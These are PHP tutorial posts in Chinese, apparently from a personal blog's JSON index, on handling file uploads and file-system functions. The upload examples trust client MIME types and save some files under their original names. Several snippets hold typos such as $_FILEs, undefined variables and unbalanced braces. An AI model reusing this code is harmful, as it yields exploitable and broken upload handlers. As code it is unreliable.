\n\n\n\n&emsp;\n$_FILES数组结构：\n\n&lt;?php\n//var_dump()或print_r()\n//打印变量的相关信息,将变量的信息详细的展示出来\nvar_dump($_FILES);             \n?>\n\n打印出来的结果的数组结构如下：\narray (size=1)\n    'file' => \n       array (size=5)\n       //文件名\n      'name' => string 'psu.jpg' (length=7) \n      //文件的mime类型\n      'type' => string 'image/jpeg' (length=10)                    \n      //缓存文件，上传的图片即保存在这里\n      'tmp_name' => string 'E:\\wamp\\tmp\\phpC32A.tmp' (length=23)\n      //错误码，详见上面错误码介绍\n      'error' => int 0                                             \n      //上传的文件大小\n      'size' => int 225824\n\n&emsp;\n2.4  move_uploaded_file() 函数[PHP move_uploaded_file() 函数]\n\n\n功能：将上传的文件移动到新位置，并命名。\n\nbool move_uploaded_file ( file, newloc)\n\n\n\n参数\n描述\n\n\n\n\nfile\n必需。规定要移动的文件。上传后的临时文件名，由系统自动生成。\n\n\nnewloc\n必需。规定文件的新位置。包含有路径的新的文件名。\n\n\n\n\n注意：\n\n参数file一般为$_FILES[“File’][“tmp_name”]，是一个文件完整的临时路径和文件名；\n参数newloc为新的路径，并且还要加上相应的重新命名文件的的格式。\n本函数仅用于通过 HTTP POST 上传的文件。\n本函数检查并确保由 file 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。\n返回值：如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。这种检查显得格外重要，如果上传的文件有可能会造成对用户或本系统的其他用户显示其内容的话。\nmove_uploaded_file()基本上与函数rename()相同，但是它只能用于通过PHP的上传机制上传的文件。这是一项安全功能，可防止用户欺骗您的脚本，向他们显示与安全相关的数据。\n\n\n&emsp;&emsp;\n三. 文件上传的步骤3.1 判断是否有错误码使用数组元素：$_FILES[‘file’][‘error’]即判断$_FILES[‘file’][‘error’]返回值！！注：错误码中没有5。\n\n\n\n错误码对应常量\n说明\n\n\n\n\n0UPLOAD_ERR_OK\n无误，可以继续进行文件上传的后续操作。\n\n\n1UPLOAD_ERR_INI_SIZE\n超出上传文件的最大限制，upload_max_filesize = 2M php.ini中设置，一般默认为2M。可根据项目中的实际需要来修改\n\n\n2UPLOAD_ERR_FORM_SIZE\n超出了指定的文件大小,根据项目的业务需求指定上传文件的大小限制\n\n\n3UPLOAD_ERR_PARTIAL\n只有部分文件被上传\n\n\n4UPLOAD_ERR_NO_FILE\n文件没有被上传\n\n\n6\n找不到临时文件夹，可能目录不存在或没权限\n\n\n7\n文件写入失败，可能磁盘满了或没有权限\n\n\n\n&emsp;示例：\n&lt;?php\nif($_FILES['file']['error'] > 0){\n   switch ($_FILES['file']['error']) {    //错误码不为0，即文件上传过程中出现了错误\n       case '1':\n           echo '文件过大';\n           break;\n       case '2':\n           echo '文件超出指定大小';\n           break;\n       case '3':\n           echo '只有部分文件被上传';\n           break;\n       case '4':\n           echo '文件没有被上传';\n           break;\n       case '6':\n           echo '找不到指定文件夹';\n           break;\n       case '7':\n           echo '文件写入失败';\n           break;\n       default:\n           echo \"上传出错&lt;br/>\";\n   }\n}else{\n   //错误码为0，即上传成功，可以进行后续处理，处理流程见下文\n}\n?>\n\n&emsp;&emsp;\n3.2 判断是否超出文件大小范围使用数组元素：$_FILES[“File’][“size”]\n&emsp;示例：\n&lt;?php\n//判断错误\nif ($_FILES['file']['error'] > 0) {\n    //有错误可停止执行\n} else {\n    //当前上传文件无误，运行本段代码\n    //判断文件是否超出了指定的大小\n    //单位为byte\n    $MAX_FILE_SIZE = 100000;\n    if ($_FILES['file']['size'] > $MAX_FILE_SIZE) {\n        //判断，如果上传的文件，大小超出了我们给的限制范围，退上传并产生错误提示\n        exit(\"文件超出指定大小\");\n    }\n}\n?>\n\n\n将我们指定的文件大小，定义为$MAX_FILE_SIZE，该变量的计数单位为byte，对应上传文件的 $_FILES[‘file’][‘size’]大小。示例代码中，限制大小约为100K及以下的文件。\n\n&emsp;&emsp;\n3.3 判断后缀名和mime类型是否符合使用数组元素：$_FILES[“File”][“type”]\n\n\nMIME(Multipurpose Internet Mail Extensions)是多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。\n在判断后缀和MIME类型的时候，我们会用到PHP的一个函数in_array(),该函数传入两个参数。第一个参数是要判断的值；第二个参数是范围数组。我们用这个函数来判断文件的后缀名和mime类型是否在允许的范围内。\n\n\n&emsp;示例：\n&lt;?php\n/*判断后缀名和MIME类型是否符合指定需求\n例如:\n当前项目指定上传后缀为.jpg或.gif的图片，则$allowSuffix = array('jpg','gif');\n*/\n//定义允许的后缀名数组\n$myImg = explode('.', $_FILES['file']['name']);\n/*\nexplode() 将一个字符串用指定的字符切割，并返回一个数组，这里我们将文件名用'.''切割,结果存在$myImg\n中，文件的后缀名即为数组的最后一个值\n*/\n$myImgSuffix = array_pop($myImg);\n/*\n根据上传文件名获取文件的后缀名\n使用in_array()函数，判断上传文件是否符合要求\n当文件后缀名不在我们允许的范围内时退出上传并返回错误信息\n*/\nif(!in_array($myImgSuffix, $allowSuffix)){\n    exit(\"文件后缀名不符\");\n}\n/*\nmime类型和文件后缀名的对应关系，我们可以通过很多途径查询到，为了避免用户自主修改文件后缀名造成文件无\n法使用。\nmime类型也必须做出限制检查mime类型，是为了防止上传者直接修改文件后缀名\n导致文件不可用或上传的文件不符合要求。\n*/\n//数组内容为允许上传的mime类型\n$allowMime = array(\n    \"image/jpg\",\n    \"image/jpeg\",\n    \"image/pjpeg\",\n    \"image/gif\"\n);\nif(!in_array($_FILES['file']['type'], $allowMime)){                      \n    //判断上传文件的mime类型是否在允许的范围内\n    exit('文件格式不正确，请检查');\n    //如果不在允许范围内，退出上传并返回错误信息\n}\n?>\n\n&emsp;&emsp;\n3.4 生成指定的路径和文件名我们的文件上传成功了，不会让它保存原名。因为，有些人在原名中有敏感关键词会违反我国的相关法律和法规。我们可以采用date()、mt_rand()或者unique()生成随机的文件名。\n\n\n$_FILES[“file”][“tmp_name”]：文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy() 函数将它复制到其它位置，此时，才算完成了上传文件过程。\n按照项目的文件安排，生成文件存储路径，为了避免文件名重复而产生的错误，按照一定的格式，生成一个随机文件名。\n\n\n&emsp;示例：\n&lt;?php\n//指定上传文件夹\n$path = \"upload/images/\";\n/*\n根据当前时间生成随机文件名，本行代码是使用当前时间 + 随机一个0-9的数字组合成文件名，后缀即为前面取到的文件后缀名\n*/\n$name = date('Y').date('m').date(\"d\").date('H').date('i').date('s').rand(0,9).'.'.$myImgSuffix;\n?>\n\n&emsp;&emsp;\n3.5  判断是否是上传文件使用函数：is_uploaded_file()\n\n\n文件上传成功时，系统会将上传的临时文件上传到系统的临时目录中。产生一个临时文件。\n同时会产生临时文件名。我们需要做的事情是将临时文件移动到系统的指定目录中。\n而移动前不能瞎移动，或者移动错了都是不科学的。移动前我们需要使用相关函数判断上传的文件是不是临时文件。\nis_uploaded_file()传入一个参数($_FILES中的缓存文件名)，判断传入的名称是不是上传文件。\n\n\n&emsp;is_uploaded_file()函数是专用的函数，来判断目标文件是否是上传文件。\n&lt;?php\n\n//使用is_uploaded_file()判断是否是上传文件,函数介绍见上文\nif(is_uploaded_file($_FILEs['file']['tmp_name'])){    \n\n}\n?>\n\n&emsp;&emsp;\n3.6  移动临时文件到指定位置使用函数：move_uploaded_file()和数组元素：$_FILES[“file”][“tmp_name”]\n\n\n临时文件是真实的临时文件，我们需要将其移动到我们的网站目录下面,让我们网站目录的数据，其他人可以访问到。\n我们使用：move_uploaded_file()。这个函数是将上传文件移动到指定位置，并命名。传入两个参数：第一个参数是指定移动的上传文件；第二个参数是指定的文件夹和名称拼接的字符串。\n需要注意的是，Linux系统中对目标目录是否有权限及磁盘空间是否足够，否则会导致上传操作失败。\n\n\n&emsp;示例：\n&lt;?php\n/*\n使用move_uploaded_file()移动上传文件至指定位置,第一个参数为上传文件，第二个参数为我们在前面指定的上传路径和名称。\n*/\nif(move_uploaded_file($_FILEs['file']['tmp_name'], $path.$name)){\n           //提示文件上传成功\n           echo \"上传成功\";                                \n       }else{\n/*\n文件移动失败，检查磁盘是否有足够的空间，或者linux类系统中文件夹是否有足够的操作权限\n*/\n           echo '上传失败';                                                \n       }\n   }else{\n       echo '不是上传文件';\n   }\n\n}\n?>\n\n&emsp;&emsp;\n四. 多文件上传多文件上传原理相同，不过在处理数据时，需要对上传数据进行特殊处理。\n&emsp;示例：\n&lt;html> \n   &lt;head> \n       &lt;meta charset=\"utf-8\" /> \n       &lt;title>单文件上传&lt;/title> \n   &lt;/head> \n   &lt;body> \n       &lt;form action=\"morefile.php\" method=\"post\" enctype=\"multipart/form-data\"> \n        &lt;input type=\"file\" name=\"file[]\">  //name比单文件上传时多了[]\n        &lt;input type=\"file\" name=\"file[]\">  //name比单文件上传时多了[]\n        &lt;input type=\"submit\" value=\"上传\"> \n    &lt;/form> \n   &lt;/body> \n&lt;/html>\n\n\n这里是一个简易的上传页面，form表单同时提交了两个文件。我们 可以通过这个页面提交内容。\n\n注意：1. input type=”file” name=”file[]”与之前相比file后多加了一个中括号2. 写了2个或者多个input type=”file” name=”file[]”我们使用 $_FILES 来接收文件信息，打印并查看数组：\n\n&lt;?php \nvar_dump($_FILES); //打印$_FILES查看数组结构 \n?>\n\n输出如下：\narray (size=1)  \n    'file' =>  \n        array (size=5) \n    'name' =>  \n        array (size=2) \n        //文件名 \n        0 => string 'psu.jpg' (length=7) \n        1 => string 'qwe.jpg' (length=7) \n    //文件mime类型 \n    'type' => array (size=2) \n            0 => string 'image/jpeg' (length=10) \n            1 => string 'image/jpeg' (length=10) \n    //缓存文件 \n    'tmp_name' =>  \n        array (size=2) \n            0 => string 'E:\\wamp\\tmp\\phpF6D5.tmp' (length=23) \n            1 => string 'E:\\wamp\\tmp\\phpF6F5.tmp' (length=23) \n    //文件错误信息 \n    'error' =>  \n        array (size=2) \n            0 => int 0 \n            1 => int 0 \n    //文件大小 \n    'size' =>  \n        array (size=2) \n        0 => int 225824     \n        1 => int 151651\n\n\n\n我们可以看到，两个文件被存储在一个数组中，键名和上传单文件是相同。所以，需要我们for()循环，来分别取出两个文件的需要用到的数据。\n在$_FILES中同时保存了两个文件的数据，我们需要使用一个简单的循环，来读取单个文件的信息，并将文件移动到我们想要放的位置。\n\n\n&emsp;\n&lt;?php\nfor ($i=0; $i &lt; count($_FILE['file']['name']); $i++) {  \n\n/* \n用is_uploaded_file()函数判断是上传文件 \n并且没有出现错 \n*/ \n\n   if(is_uploaded_file($_FILEs['file']['tmp_name'][$i]) &amp;&amp; $_FILEs['file']['error'][$i] == 0){     \n       if(move_uploaded_file($_FILEs['file']['tmp_name'][$i],'upload/'.$_FILE['file']['name'][$i])){\n   //用move_uploaded_file()函数移动文件到指定的位置并使用文件原名 \n   echo \"上传成功\"; \n\n       }else{ \n\n           echo '上传失败'; \n\n       } \n\n   }else{ \n\n       echo '上传失败'; \n\n   } \n\n} \n?>\n\n&emsp;&emsp;\n五. 单文件上传完整代码&lt;?php\nif ($_FILES['file']['error'] > 0) {\n switch ($_FILES['file']['error']) {\n //错误码不为0，即文件上传过程中出现了错误\n case '1':\n echo '文件过大';\n break;\n case '2':\n echo '文件超出指定大小';\n break;\n case '3':\n echo '只有部分文件被上传';\n break;\n case '4':\n echo '文件没有被上传';\n break;\n case '6':\n echo '找不到指定文件夹';\n break;\n case '7':\n echo '文件写入失败';\n break;\n default:\n echo \"上传出错&lt;br/>\";\n }\n} else {\n\n $MAX_FILE_SIZE = 100000;\n if ($_FILES['file']['size'] > $MAX_FILE_SIZE) {\n exit(\"文件超出指定大小\");\n\n }\n\n $allowSuffix = array(\n 'jpg',\n 'gif',\n );\n\n $myImg = explode('.', $_FILES['file']['name']);\n\n $myImgSuffix = array_pop($myImg);\n\n if (!in_array($myImgSuffix, $allowSuffix)) {\n exit(\"文件后缀名不符\");\n }\n\n $allowMime = array(\n \"image/jpg\",\n \"image/jpeg\",\n \"image/pjpeg\",\n \"image/gif\",\n );\n\n if (!in_array($_FILES['file']['type'], $allowMime)) {\n exit('文件格式不正确，请检查');\n }\n\n $path = \"upload/images/\";\n $name = date('Y') . date('m') . date(\"d\") . date('H') . date('i') . date('s') . rand(0, 9) . '.' . $myImgSuffix;\n\n if (is_uploaded_file($_FILEs['file']['tmp_name'])) {\n\n if (move_uploaded_file($_FILEs['file']['tmp_name'], $path . $name)) {\n echo \"上传成功\";\n } else {\n echo '上传失败';\n }\n\n } else {\n echo '不是上传文件';\n }\n\n}\n?>\n\n","thumbnail":"https://i.loli.net/2019/02/21/5c6e41bfcc0d9.jpg","plink":"https://Directoree.github.io/post/PHP-Upload/"},{"title":"PHP-文件系统","date":"2019-02-20T05:29:20.000Z","updated":"2019-02-26T08:22:31.455Z","content":"学习文件处理本质上面就是学习文件处理的函数。 ヾ(๑╹◡╹)ﾉ”\n&ensp;&ensp;\nPHP 文件系统\n\n&emsp;&emsp;\n一. 读取文件&emsp;\n1.1 readfile读取文件读取一个文件内容的函数：int readfile ( string $文件名)\n\n功能：传入一个文件路径，输出这个文件里面的内容。\n\n&lt;?php\n   //linux类的读取方式\n   readfile(\"/home/paul/test.txt\");\n   //windows类的读取方式\n   readfile(\"c:\\\\boot.ini\");\n?>\n\n\n注意：上面的代码中windows的斜线是\\斜线，可能会转义掉一些字符。因此，我们写的时候写上两个斜线。\n\n&emsp;&emsp;\n1.2 file_get_contents打开文件上面的是单纯打文件就直接输出了，有没有打开文件后，能够赋值给一个变量的操作方式呢。string file_get_contents ( string filename)\n\n\n功能：传入一个文件或文件路径，打开这个文件返回文件的内容。文件的内容是一个字符串。\n\n&lt;?php\n\n   $filename = 'NoAlike.txt';\n\n   $filestring = file_get_contents($filename);\n   echo $filestring;\n?>\n\n\n上面的代码，就打开了一个文件，并且将文件当中的内容进行了输出。\n\n&emsp;我们来针对之前的知识把代码进行一下扩展。用一用之前的知识点。\n&lt;?php\n   //假设我们有一个多行的文件叫NoAlike.txt，没有的话你可以新建一个这个文件\n    $filename = 'NoAlike.txt';\n\n\n   //打开这个文件，将文件内容赋值给$filestring\n   $filestring = file_get_contents($filename);\n\n   //因为每一行有一个回车即\\n，我用\\n来把这个字符串切割成数组\n   $filearray = explode(\"\\n\", $filestring);\n\n   //把切割成的数组，下标赋值给$key,值赋值给$val，每次循环将$key加1。\n   while (list($key, $val) = each($filearray)) {\n       ++$key;\n       $val = trim($val);\n\n       //用的单引号，单引号不解释变量进行了拼接而已\n       print 'Line' . $key .':'.  $val.'&lt;br />';\n   }\n?>\n\n&emsp;\n上述的explode()、list()两个字符串函数和each()数组函数。1. explode()函数：把字符串打散为数组。[PHP explode() 函数]&emsp;[PHP String 函数]语法：explode(separator,string,limit)\n\n\n\n\n参数\n描述\n\n\n\n\nseparator\n必需。规定在哪里分割字符串。\n\n\nstring\n必需。要分割的字符串。\n\n\nlimit\n可选。规定所返回的数组元素的数目。可能的值：大于 0 - 返回包含最多 limit 个元素的数组小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组0 - 返回包含一个元素的数组\n\n\n\n&emsp;\n2. list()函数：把数组中的值赋给一些变量,在一次操作中给一组变量赋值。[PHP list() 函数]\n\n&lt;?php\n$my_array = array(\"Dog\",\"Cat\",\"Horse\");\n\nlist($a, $b, $c) = $my_array;\necho \"I have several animals, a $a, a $b and a $c.\";\n?>\n\n&emsp;\n3. each()函数：返回当前元素的键名和键值。该元素的键名和键值返回到带有四个元素的数组中。两个元素（1 和 Value）包含键值，两个元素（0 和 Key）包含键名。[PHP each() 函数]\n\n&lt;?php\n$people = array(\"Bill\", \"Steve\", \"Mark\", \"David\");\nvar_dump(each($people));\nvar_dump(each($people));\n?>\n\n运行结果：\nG:\\WAMP\\www\\2-20-1.php:3:\narray (size=4)\n  1 => string 'Bill' (length=4)\n  'value' => string 'Bill' (length=4)\n  0 => int 0\n  'key' => int 0\nG:\\WAMP\\www\\2-20-1.php:4:\narray (size=4)\n  1 => string 'Steve' (length=5)\n  'value' => string 'Steve' (length=5)\n  0 => int 1\n  'key' => int 1\n\n&emsp;&emsp;\n1.3 fopen、fread、fclose操作读取文件上面file_get_contents打开文件的方式简单、粗暴。下面的\nresource fopen ( string $文件名, string 模式)string fread ( resource $操作资源, int 读取长度)bool fclose ( resource $操作资源 )\n\n通过上面的函数我们来讲解资源类型的通常操作方式：1.打开资源2.使用相关函数进行操作3.关闭资源&emsp;\n1. fopen函数：打开文件，返回一个资源参数主要有两个：1.文件打开的路径，2.打开文件的模式例：$fp=fopen(‘NoAlike.txt’, “r”);\n\n\n返回类型是一个资源类型。资源类型需要其他的函数来操作这个资源。所有的资源有打开就要有关闭。\n\n2. fread函数：读取打开的文件资源。也包含两个参数，读取指定长度的文件资源，读取一部份向后移动一部份。至到文件结尾。例：$contents = fread($fp, 1024);\n\n&emsp;\n3. fclose函数：fclose函数的功能是关闭资源。资源有打开就有关闭。包含一个参数，这个参数就是fopen()返回的资源。例：fclose($fp); \n\n&emsp;    \nfopen的模式有下面几个(。・∀・)ノ\n\n\n\n\n模式\n说明\n\n\n\n\nr\n只读方式打开，将文件指针指向文件头。\n\n\nr+\n读写方式打开，将文件指针指向文件头。\n\n\nw\n写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建\n\n\nw+\n读写方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建\n\n\na\n写入方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建\n\n\na+\n读写方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之\n\n\nx\n创建并以写入方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回 FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建\n\n\nx+\n创建并以读写方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回 FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建\n\n\n\n&emsp;\nr模式示例：1.打开文件：fopen()\n\n&lt;?php\n   //你可以创建一个NoAlike.txt，以只读模式打开\n   $fp = fopen('NoAlike.txt', \"r\");\n\n\n   //var_dump()操作一下$fp看看效果，输出的是不是只有类型提示的是resource\n   var_dump($fp);\n?>\n\n&emsp;2.读取文件：fread()\n\n\n&lt;?php\n   $fp = fopen('NoAlike.txt', \"r\");\n\n   //打开一个文件类型后，读取长度\n   $contents = fread($fp, 1024);\n?>\n\n&emsp;3.关闭文件：fclose()\n\n\n&lt;?php\n   $fp = fopen($filename, 'r');\n   $contents = fread($fp, 1024);\n   fclose($fp);\n   echo $contents;\n?>\n\n&emsp;其他注意事项：\n\n\n\n模式\n说明\n\n\n\n\nt\nwindows下将\\n转为\\r\\n\n\n\nb\n二进制打开模式\n\n\n\n\n说明：Windows 下提供了一个文本转换标记（’t’）可以透明地将 \\n 转换为 \\r\\n。与此对应还可以使用 ‘b’ 来强制使用二进制模式，这样就不会转换数据。要使用这些标记，要么用 ‘b’ 或者用 ‘t’ 作为 mode 参数的最后一个字符。\n\n&emsp;&emsp;\n二. 创建和修改文件内容2.1 file_put_contents写入文件int file_put_contents ( string $文件路径, string $写入数据])\n\n\n功能：向指定的文件当中写入一个字符串，如果文件不存在则创建文件。返回的是写入的字节长度\n\n&lt;?php\n   $data = \"在PHP中文网学好PHP，妹子票子不再话下！\";\n\n   $numbytes = file_put_contents('bin.txt', $data);\n\n   if($numbytes){\n      //$numbytes接收到整形的数字\n       echo '写入成功，我们读取看看结果试试：';\n\n       echo file_get_contents('bin.txt');\n\n   }else{\n       echo '写入失败或者没有权限，注意检查';\n   }\n?>\n\n&emsp;\n2.2 fwrite配合fopen进行写入操作、fopen()打开模式的比较int fwrite ( resource $文件资源变量, string $写入的字符串 [, int 长度])注：fwrite的别名函数是fputs1. fopen()的w模式：写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建。每一次写入新的数据时，都会将原来的数据清空之后才写入！\n\n&lt;?php\n   $filename = 'test.txt';\n   $fp= fopen($filename, \"w\");\n   $len = fwrite($fp, '我是一只来自北方的狼，却在南方冻成了狗');\n   fclose($fp);\n   print $len .'字节被写入了\\n';\n?>\n\n\n总结：1. 不论有没有新建都会打开文件重新写入2.原有的文件内容会被覆盖掉3.文件不存在会创建\n\n那我们来对比一下以下几个模式的不同：\n\n\n\n模式\n说明\n\n\n\n\nr\n只能读不能使用fwrite写\n\n\nr+\n可操作读、写(可使用fwrite写入)\n\n\nw\n只可以写功能\n\n\nw+\n即可读又可以写\n\n\n\n&emsp;\n2.3 a模式和w模式、x模式和w模式的不同1. a模式和w模式总结：\n\n\n\n\n模式\n总结\n\n\n\n\nx\n每次写入会干掉原有文件的内容，文件不存在都会创建\n\n\na\n每次写入都会向文件的尾端追加内容\n\n\n\n&emsp;\n2. x模式和w模式总结：\n\n&lt;?php\n   $filename = 'test.txt';\n   $fp= fopen($filename, \"x\");\n   $len = fwrite($fp,'读大学迷茫了，PHP中文网学PHP给你希望');\n   echo  $len .'字节被写入了\\n';\n?>\n\n\n总结：   1.文件存在的时候会报错   2.如果把$filename 改成其他的文件名,就可以了。但是，再次刷新的时候又报错了   3.x+ 是增强的x模式。读取时也可以使用。\n\n&emsp;&emsp;\n三. 创建临时文件使用这个函数：resource tmpfile ( )\n\n功能：创建一个临时文件，返回资源类型。关闭文件即被删除。\n\n&lt;?php\n   //创建了一个临时文件,创建后并且打开这个文件    \n   $handle = tmpfile();\n\n   //向里面写入了数据\n   $numbytes = fwrite($handle, '写入临时文件');\n\n   //关闭临时文件，文件即被删除\n   fclose($handle);\n\n   echo  '向临时文件中写入了'.$numbytes . '个字节';\n?>\n\n&emsp;&emsp;\n四. 移动、拷贝和删除文件4.1 重命名文件bool rename(oldname,newname,context);\n\n\n\n\n参数\n描述\n\n\n\n\noldname\n必需。规定要重命名的文件或目录(文件夹)。\n\n\nnewname\n必需。规定文件或目录的新名称。\n\n\ncontext\n可选。规定文件句柄的环境。context 是可修改流的行为的一套选项。\n\n\n\n&lt;?php\n   //旧文件名\n   $filename = 'test.php.old';\n\n   //新文件名\n   $filename2 = 'test.php';\n\n   //复制文件\n   rename($filename, $filename2);\n?>\n\n&emsp;\n4.2 复制文件bool copy(源文件,目标文件); \n\n\n功能：将指定路径的源文件，复制一份到目标文件的位置。如果复制到当前目录下，则必须重新改一个名字，其他目录下的话也要在目的路径下加上文件名，不管改不改名字。\n\ncopy(source,destination):\n\n\n\n参数\n描述\n\n\n\n\nsource\n必需。规定要复制的文件。\n\n\ndestination\n必需。规定复制文件的目的地。\n\n\n\n(1)创建文件并复制到当前文件夹下面↓↓\n&lt;?php\n    //创建文件\n   $fi = fopen('copy.txt',\"w\");  \n   $a=fwrite($fi,\"\");\n   //旧文件名 \n   $filename = 'copy.txt';  \n   //新文件名   \n   $filename2 = $filename . '_new.txt';  \n\n   //修改名字。\n   copy($filename, $filename2);\n   fclose($fi);\n?>\n\n(2)创建文件并复制到其他文件夹下面↓↓\n&lt;?php\n    //创建文件\n   $fi = fopen('copy.txt',\"w\");  \n   $a=fwrite($fi,\"\");\n   //旧文件名 \n   $filename = 'copy.txt';  \n   //新文件名   \n   $filename2 = \"./01/copy.txt\";  \n\n   //修改名字。\n   copy($filename, $filename2);\n   fclose($fi);\n?>\n\n&emsp;\n4.3 删除文件bool unlink(指定路径的文件); \n\n&lt;?php\n   $filename = 'test.txt';\n\n   if (unlink($filename)) {\n       echo  \"删除文件成功 $filename!\\n\";\n   } else {\n       echo \"删除 $filename 失败!\\n\";\n   }\n?>\n\n&emsp;&emsp;\n五. 检测文件属性函数\n\n\n函数\n功能\n\n\n\n\n bool file_exists ( $指定文件名或者文件路径)\n文件是否存在    \n\n\n bool is_readable ( $指定文件名或者文件路径)\n文件是否可读\n\n\n bool is_writeable ( $指定文件名或者文件路径)\n文件是否可写\n\n\n bool is_executable ( $指定文件名或者文件路径)\n文件是否可执行\n\n\n bool is_file ( $指定文件名或者文件路径)\n是否是文件\n\n\n bool is_dir ( $指定文件名或者文件路径)\n是否是目录\n\n\n void clearstatcache ( void )\n清楚文件的状态缓存\n\n\n\n&emsp;\n&lt;?php\n  $g=file_exists(\"install.txt\");\n  echo $g;\n\nif(file_exists('install.txt')){\n   echo '已安装，请不要再次进行安装';\n   exit;\n\n}\nelse \n    echo 5462564;\n?>\n运行结果：1 已安装，请不要再次进行安装\n\n&emsp;&emsp;\n六. 文件常用函数和常量6.1 目录分割符常量\n\n\n平台\n分割符\n\n\n\n\nwindows\n\\ 或者 /\n\n\n类unix\n/\n\n\n\n\n\nwindows 的路径格式为 d:\\xxx\\xxx 注意：windows支持 d:/xxx/xxx\nlinux 的路径格式为 /home/xxx/xxx 注意：如果\\home\\xxx\\xxx 在linux上是错误的\n所以当开启转义之类的话，转义字符 \\ 用一起的话 d:\\xxx\\xxx 是一样的。判断时候有两个 \\ 有的话 再转成一个\\ 再把 \\ 替换成 /当路径分割，这样在linux上或者windos上的路径就能保持统一了。\n\n\n&emsp;\n6.2 DIRECTORY_SEPARATOR常量在 Windows 中，斜线（/）和反斜线（\\）都可以用作目录分隔符，在linux上路径的分隔符是/，这就导致了一个问题，比如开发机器是windows，有一个图片上传程序，，而我们又使用了(\\)作为文件分隔符，调试机器上指定的上传文件保存目录是：define(‘ROOT’,dirname(__FILE__).”\\upload”)，在本地调试都很正常，但是上传到linux服务器的时候会发现会出错。这个问题就是出在文件的分隔符上，windows上习惯性的使用\\作为文件分隔符，但是在linux上人家是不认识这个标识的，人家只认识/，于是就要引入下面这个php内置变量了：DIRECTORY_SEPARATOR。上面的写法可以改写为以下无错写法：define(‘ROOT’,dirname(__FILE__).DIRECTORY_SEPARATOR.”upload”);这样就可以确保不会出错了。\n\n\n总结：DIRECTORY_SEPARATOR是一个返回跟操作系统相关的路径分隔符的php内置命令，在windows上返回\\，而在linux或者类unix上返回/，就是这么个区别，通常在定义包含文件路径或者上传保存目录的时候会用到。\n\n&emsp;\n6.3 文件指针操作函数rewind ( resource handle)\n\n\n功能：指针回到开始处\n\nfseek ( resource handle, int offset [, int from_where])\n\n\n功能：文件指针向后移动指定字符\n\n注意：我们在之前的读取当中我们发现fread读取指定长度的数据。读取指定长度的内容，下次再读取的时候从原位置开始再接着向后读取。\n[PHP fseek() 函数]\n\n\n\n\n参数\n描述\n\n\n\n\nfile\n必需。规定要在其中定位的文件。\n\n\noffset\n必需。规定新的位置（从文件头开始以字节数度量）。\n\n\nwhence\n可选。可能的值：SEEK_SET - 设定位置等于 offset 字节。默认。SEEK_CUR - 设定位置为当前位置加上 offset。SEEK_END - 设定位置为文件末尾加上 offset （要移动到文件尾之前的位置，offset 必须是一个负值）。\n\n\n\n&emsp;\n6.4 filesize 检测文件的大小&lt;?php\n\n$filename = 'demo.txt';\necho $filename . '文件大小为: ' . filesize($filename) . ' bytes';\n\n?>\n\n&emsp;还有一些其他操作文件的函数，读取文件：\n\n\n\n函数名\n功能\n\n\n\n\nfile\n把整个文件读入一个数组中\n\n\nfgets\n从文件指针中读取一行,读到最后返回false\n\n\nfgetc\n从文件指针中读取一个字符，读到最后返回false\n\n\nftruncate\n将文件截断到给定的长度\n\n\n\n&emsp;\n6.5 文件的时间函数\n\n\n函数名\n功能\n\n\n\n\nfilectime\n文件创建时间\n\n\nfilemtime\n文件修改时间\n\n\nfileatime\n文件上次访问时间\n\n\n\n&lt;?php\n\n$filename = 'demo.txt';\n\nif (file_exists($filename)) {\n   echo '$filename文件的上次访问时间是:'  . date(\"Y-m-d H:i:s\", fileatime($filename));\n   echo '$filename文件的创建时间是: ' . date(\"Y-m-d H:i:s\", filectime($filename));\n    echo '$filename文件的修改时间是: ' . date(\"Y-m-d H:i:s\", filemtime($filename));}\n?>\n\n&emsp;&emsp;\n七. 文件锁处理机制\n文件锁的用途：若一个人在写入一个文件，另外一个人同时也打个了这个文件进行写入文件。这情况下，如果遇到一定的碰撞概率的话，不知道到底谁的操作为准。因此，这个时候我们引入锁机制。若用户A在写入或者读取这个文件的时候，将文件加上共享所。我可以读，其他人也可以读。但是，我如果这与的时候。我使用独占锁。这个文件归我了，你们都别动，除非我将文件锁进行释放。\n\n注意：不论加上了文件锁后要注意释放。\n\nbool flock(file,lock,block)\n\n\n\n参数\n描述\n\n\n\n\nfile\n必需。规定要锁定或释放的已打开的文件。\n\n\nlock\n必需。规定要使用哪种锁定类型。lock 参数可以是以下值之一：要取得共享锁定（读取的程序），将 lock 设为 LOCK_SH（PHP 4.0.1 以前的版本设置为 1）要取得独占锁定（写入的程序），将 lock 设为 LOCK_EX（PHP 4.0.1 以前的版本中设置为 2）要释放锁定（无论共享或独占），将 lock 设为 LOCK_UN（PHP 4.0.1 以前的版本中设置为 3）如果不希望 flock() 在锁定时堵塞，则给 lock 加上 LOCK_NB(PHP 4.0.1 以前的版本中设置为 4)\n\n\nblock\n可选。若设置为 1 或 true，则当进行锁定时阻挡其他进程。\n\n\n\n示例：\n&lt;?php\n\n$fp = fopen(\"demo.txt\", \"r+\");\n\n// 进行排它型锁定\nif (flock($fp, LOCK_EX)) { \n\n   fwrite($fp, \"文件这个时候被我独占了哟\\n\");\n\n  // 释放锁定\n   flock($fp, LOCK_UN);    \n} else {\n   echo 